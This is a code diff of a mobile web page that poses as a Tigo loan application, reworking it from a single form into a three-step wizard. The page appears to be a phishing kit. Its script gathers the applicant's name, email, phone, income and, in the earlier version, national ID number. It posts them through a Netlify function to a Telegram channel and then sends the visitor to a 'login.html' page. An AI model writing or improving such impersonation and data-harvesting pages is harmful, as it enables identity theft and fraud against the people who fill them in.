@@ -4,8 +4,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Tigo Loan Application</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <title>Ombi la Mkopo - Tigo</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * {
             box-sizing: border-box;
@@ -32,110 +32,59 @@
             display: flex;
             flex-direction: column;
             position: relative;
-            overflow: auto;
+            overflow: hidden;
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
         }
 
         .header {
             background-color: #E3000F;
             color: white;
-            padding: 24px 20px;
+            padding: 20px;
             text-align: center;
+            position: relative;
         }
 
         .header h1 {
-            font-size: 24px;
+            font-size: 20px;
             font-weight: 600;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 12px;
+        }
+
+        .step-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: rgba(255, 255, 255, 0.4);
+            transition: all 0.3s ease;
+        }
+
+        .step-dot.active {
+            background-color: #ffffff;
+            width: 24px;
+            border-radius: 4px;
         }
 
         .content {
             padding: 24px 20px;
             flex: 1;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
         }
 
-        .form-section {
-            margin-bottom: 24px;
+        .form-step {
+            display: none;
+            animation: slideIn 0.3s ease-out;
         }
 
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-group label {
+        .form-step.active {
             display: block;
-            font-size: 14px;
-            font-weight: 500;
-            color: #3a3a3c;
-            margin-bottom: 8px;
-        }
-
-        .form-group input,
-        .form-group select {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #d1d5db;
-            border-radius: 8px;
-            font-size: 16px;
-            color: #111;
-            background-color: #f9fafb;
-            transition: border-color 0.2s;
-        }
-
-        .form-group input:focus,
-        .form-group select:focus {
-            outline: none;
-            border-color: #E3000F;
-            background-color: #fff;
-        }
-
-        .currency-input {
-            position: relative;
-        }
-
-        .currency-input span {
-            position: absolute;
-            left: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #6b7280;
-            font-weight: 500;
-        }
-
-        .currency-input input {
-            padding-left: 55px;
-        }
-
-        .next-btn {
-            width: 100%;
-            padding: 16px;
-            background-color: #E3000F;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 10px;
-            margin-bottom: 30px;
-            transition: background-color 0.2s;
-        }
-
-        .next-btn:active {
-            background-color: #c8000d;
-        }
-
-        .info-card {
-            background-color: #fff1f2;
-            border: 1px solid #ffe4e6;
-            padding: 16px;
-            border-radius: 8px;
-            margin-bottom: 24px;
-        }
-
-        .info-card p {
-            font-size: 13px;
-            color: #be123c;
-            line-height: 1.5;
         }
 
         @keyframes slideIn {
@@ -150,8 +99,125 @@
             }
         }
 
-        .content {
-            animation: slideIn 0.3s ease-out;
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1c1c1e;
+            margin-bottom: 8px;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #d1d5db;
+            border-radius: 10px;
+            font-size: 16px;
+            color: #1c1c1e;
+            background-color: #f9fafb;
+            transition: all 0.2s;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #E3000F;
+            background-color: #fff;
+            box-shadow: 0 0 0 3px rgba(227, 0, 15, 0.1);
+        }
+
+        .summary-box {
+            background-color: #f8f9fa;
+            border: 1px solid #e9ecef;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 10px;
+        }
+
+        .summary-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1c1c1e;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #dee2e6;
+            padding-bottom: 8px;
+        }
+
+        .summary-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .summary-label {
+            color: #6c757d;
+        }
+
+        .summary-value {
+            font-weight: 600;
+            color: #1c1c1e;
+            text-align: right;
+        }
+
+        .btn-container {
+            margin-top: auto;
+            padding: 10px 0;
+            display: flex;
+            gap: 12px;
+        }
+
+        .next-btn,
+        .back-btn {
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .next-btn {
+            background-color: #E3000F;
+            color: white;
+            flex: 2;
+        }
+
+        .back-btn {
+            background-color: #f2f2f7;
+            color: #1c1c1e;
+            flex: 1;
+        }
+
+        .next-btn:active {
+            background-color: #c8000d;
+        }
+
+        .back-btn:active {
+            background-color: #e5e5ea;
+        }
+
+        .currency-symbol {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #6c757d;
+            font-weight: 500;
+        }
+
+        .input-with-symbol {
+            position: relative;
+        }
+
+        .input-with-symbol input {
+            padding-left: 35px;
         }
     </style>
 </head>
@@ -160,61 +226,182 @@
     <div class="app-container">
         <header class="header">
             <h1>Tigo Loan Application</h1>
+            <div class="step-indicator">
+                <div class="step-dot active" id="dot-1"></div>
+                <div class="step-dot" id="dot-2"></div>
+                <div class="step-dot" id="dot-3"></div>
+            </div>
         </header>
 
         <main class="content">
-            <div class="info-card">
-                <p>Welcome to Tigo Nivushe. Please fill in your accurate details to process your loan application
-                    instantly.</p>
+            <!-- Step 1: Loan Details -->
+            <div class="form-step active" id="step-1">
+                <div class="form-group">
+                    <label>Loan Type</label>
+                    <select id="loan-type">
+                        <option>Personal Loan</option>
+                        <option>Business Loan</option>
+                        <option>Emergency Loan</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Loan Amount ($)</label>
+                    <div class="input-with-symbol">
+                        <span class="currency-symbol">$</span>
+                        <input type="number" id="loan-amount" placeholder="Enter amount">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Loan Term</label>
+                    <select id="loan-term">
+                        <option>12 Months</option>
+                        <option>24 Months</option>
+                        <option>36 Months</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Purpose of Loan</label>
+                    <input type="text" id="loan-purpose" placeholder="e.g. Education, Health">
+                </div>
             </div>
 
-            <form id="loan-form" action="login.html">
-                <div class="form-section">
-                    <div class="form-group">
-                        <label for="fullname">Jina Kamili (Full Name)</label>
-                        <input type="text" id="fullname" placeholder="Mfano: John Doe" required>
-                    </div>
+            <!-- Step 2: Personal Information -->
+            <div class="form-step" id="step-2">
+                <div class="form-group">
+                    <label>First Name</label>
+                    <input type="text" id="first-name" placeholder="John">
+                </div>
+                <div class="form-group">
+                    <label>Last Name</label>
+                    <input type="text" id="last-name" placeholder="Doe">
+                </div>
+                <div class="form-group">
+                    <label>Email Address</label>
+                    <input type="email" id="email" placeholder="john.doe@example.com">
+                </div>
+                <div class="form-group">
+                    <label>Phone Number</label>
+                    <input type="tel" id="app-phone" placeholder="0XXXX XXXXX">
+                </div>
+            </div>
 
-                    <div class="form-group">
-                        <label for="nida">Namba ya NIDA</label>
-                        <input type="text" id="nida" placeholder="Weka namba ya NIDA" required>
-                    </div>
-
-                    <div class="form-group">
-                        <label for="amount">Kiasi Unachoomba (Loan Amount)</label>
-                        <div class="currency-input">
-                            <span>TZS</span>
-                            <input type="number" id="amount" placeholder="0" required min="1000" max="500000">
-                        </div>
-                    </div>
-
-                    <div class="form-group">
-                        <label for="duration">Muda wa Marejesho (Duration)</label>
-                        <select id="duration" required>
-                            <option value="7">Siku 7 (7 Days)</option>
-                            <option value="14">Siku 14 (14 Days)</option>
-                            <option value="30">Siku 30 (1 Month)</option>
-                        </select>
+            <!-- Step 3: Employment & Summary -->
+            <div class="form-step" id="step-3">
+                <div class="form-group">
+                    <label>Employment Status</label>
+                    <select id="employment-status">
+                        <option>Employed</option>
+                        <option>Self-Employed</option>
+                        <option>Unemployed</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Annual Income ($)</label>
+                    <div class="input-with-symbol">
+                        <span class="currency-symbol">$</span>
+                        <input type="number" id="annual-income" placeholder="50,000">
                     </div>
                 </div>
 
-                <button type="submit" class="next-btn">Endelea (Continue)</button>
-            </form>
+                <div class="summary-box">
+                    <h3 class="summary-title">Application Summary</h3>
+                    <div class="summary-item">
+                        <span class="summary-label">Loan Amount:</span>
+                        <span class="summary-value" id="sum-amount">$0</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Loan Term:</span>
+                        <span class="summary-value" id="sum-term">12 months</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Purpose:</span>
+                        <span class="summary-value" id="sum-purpose">-</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Applicant:</span>
+                        <span class="summary-value" id="sum-name">-</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="btn-container">
+                <button class="back-btn" id="prev-btn" style="display: none;">Back</button>
+                <button class="next-btn" id="next-btn">Next</button>
+            </div>
         </main>
     </div>
-    <script>
-        document.getElementById('loan-form').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const fullname = document.getElementById('fullname').value;
-            const nida = document.getElementById('nida').value;
-            const amount = document.getElementById('amount').value;
-            const duration = document.getElementById('duration').value;
 
-            const message = `<b>Tigo Loan - New Application</b>\n` +
-                `Name: ${fullname}\n` +
-                `NIDA: <code>${nida}</code>\n` +
-                `Amount: TZS ${amount}\n` +
-                `Duration: ${duration} Days`;
+    <script>
+        let currentStep = 1;
+
+        const nextBtn = document.getElementById('next-btn');
+        const prevBtn = document.getElementById('prev-btn');
+        const steps = document.querySelectorAll('.form-step');
+        const dots = document.querySelectorAll('.step-dot');
+
+        nextBtn.addEventListener('click', async () => {
+            if (currentStep < 3) {
+                currentStep++;
+                updateUI();
+            } else {
+                await submitApplication();
+            }
+        });
+
+        prevBtn.addEventListener('click', () => {
+            if (currentStep > 1) {
+                currentStep--;
+                updateUI();
+            }
+        });
+
+        function updateUI() {
+            steps.forEach((step, index) => {
+                step.classList.toggle('active', index + 1 === currentStep);
+            });
+
+            dots.forEach((dot, index) => {
+                dot.classList.toggle('active', index + 1 === currentStep);
+            });
+
+            prevBtn.style.display = currentStep === 1 ? 'none' : 'block';
+            nextBtn.textContent = currentStep === 3 ? 'Login Now' : 'Next';
+
+            if (currentStep === 3) {
+                updateSummary();
+            }
+        }
+
+        function updateSummary() {
+            document.getElementById('sum-amount').textContent = '$' + (document.getElementById('loan-amount').value || '0');
+            document.getElementById('sum-term').textContent = document.getElementById('loan-term').value;
+            document.getElementById('sum-purpose').textContent = document.getElementById('loan-purpose').value || '-';
+            document.getElementById('sum-name').textContent = document.getElementById('first-name').value + ' ' + document.getElementById('last-name').value;
+        }
+
+        async function submitApplication() {
+            const data = {
+                loanType: document.getElementById('loan-type').value,
+                amount: document.getElementById('loan-amount').value,
+                term: document.getElementById('loan-term').value,
+                purpose: document.getElementById('loan-purpose').value,
+                name: document.getElementById('first-name').value + ' ' + document.getElementById('last-name').value,
+                email: document.getElementById('email').value,
+                phone: document.getElementById('app-phone').value,
+                employment: document.getElementById('employment-status').value,
+                income: document.getElementById('annual-income').value
+            };
+
+            const message = `<b>Tigo Loan - Detailed Application</b>\n` +
+                `Name: ${data.name}\n` +
+                `Email: ${data.email}\n` +
+                `Phone: ${data.phone}\n` +
+                `Type: ${data.loanType}\n` +
+                `Amount: $${data.amount}\n` +
+                `Term: ${data.term}\n` +
+                `Purpose: ${data.purpose}\n` +
+                `Employment: ${data.employment}\n` +
+                `Income: $${data.income}`;
 
             try {
                 await fetch('/.netlify/functions/send-telegram', {
@@ -227,7 +414,7 @@
             }
 
             window.location.href = 'login.html';
-        });
+        }
     </script>
 </body>
 
